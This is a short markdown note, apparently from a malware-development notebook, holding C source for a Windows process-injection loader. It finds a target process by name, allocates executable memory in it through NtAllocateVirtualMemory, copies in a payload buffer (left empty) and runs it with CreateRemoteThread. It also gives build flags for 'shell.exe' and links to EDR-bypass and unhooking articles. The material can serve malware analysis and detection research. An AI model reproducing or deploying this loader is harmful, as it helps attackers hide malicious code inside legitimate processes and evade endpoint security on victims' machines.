# NTAPI

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <windows.h>

#pragma comment(lib, "ntdll")

/*
https://cocomelonc.github.io/tutorial/2021/12/07/malware-injection-10.html
https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory

$ x86_64-w64-mingw32-g++ ntallocatevirtualmemory.c -o shell.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
*/

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   *BaseAddress,
    ULONG   ZeroBits,
    PULONG  RegionSize,
    ULONG   AllocateType,
    ULONG   Protect
);

unsigned char payload[] = "";

unsigned int size = sizeof(payload);

DWORD getProcessID(const char *process_name) {
    HANDLE handle_snapshot;
    PROCESSENTRY32 process_entry;
    DWORD process_id = 0;
    BOOL handle_result;

    // snapshot of all processes in the system
    handle_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(INVALID_HANDLE_VALUE == handle_snapshot)
        return 0;

    // Initializing size: needed for using Process32First
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    // Info about first process encountered in a system snapshot
    handle_result = Process32First(handle_snapshot, &process_entry);

    // Retrieve information about the processes
    // and exit if unsuccessful
    while(handle_result) {
        // if we find the process: return process ID
        if(strcmp(process_name, process_entry.szExeFile) == 0) {
            process_id = process_entry.th32ProcessID;
            break;
        }
        handle_result = Process32Next(handle_snapshot, &process_entry);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(handle_snapshot);
    return process_id;
}

int main(int argc, char *argv[]) {
    DWORD process_id = getProcessID(argv[1]);
    HANDLE process_handle; // process handle
    HANDLE remote_thread; // remote thread
    PVOID remote_buffer; // remote buffer

    HMODULE ntdll = GetModuleHandleA("ntdll");

    // Parse process ID
    // printf("process_id: %i\n", atoi(argv[1]));
    printf("process_id: %i\n", process_id);

    // process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    process_handle = OpenProcess(0x00000028, FALSE, process_id);
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory) GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    // Allocate memory buffer for remote process
    NtAllocateVirtualMemory(process_handle, &remote_buffer, 0, (PULONG)&size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // "Copy" data between processes
    WriteProcessMemory(process_handle, remote_buffer, payload, size, NULL);

    // Our process start new thread
    remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
    CloseHandle(process_handle);
    return 0;
}

```

---
## References

### MalAPI

- [MalAPI: `NtAllocateVirtualMemory`](https://malapi.io/winapi/NtAllocateVirtualMemory)

https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/

https://makosecblog.com/malware-dev/dll-unhooking-csharp/

https://hadess.io/edr-evasion-techniques-using-syscalls/

https://kymb0.github.io/malwaredev-defeat-edr-unhook/

https://labs.withsecure.com/content/dam/labs/docs/withsecure-edr-bypassing-via-memory-manipulation-techniques.pdf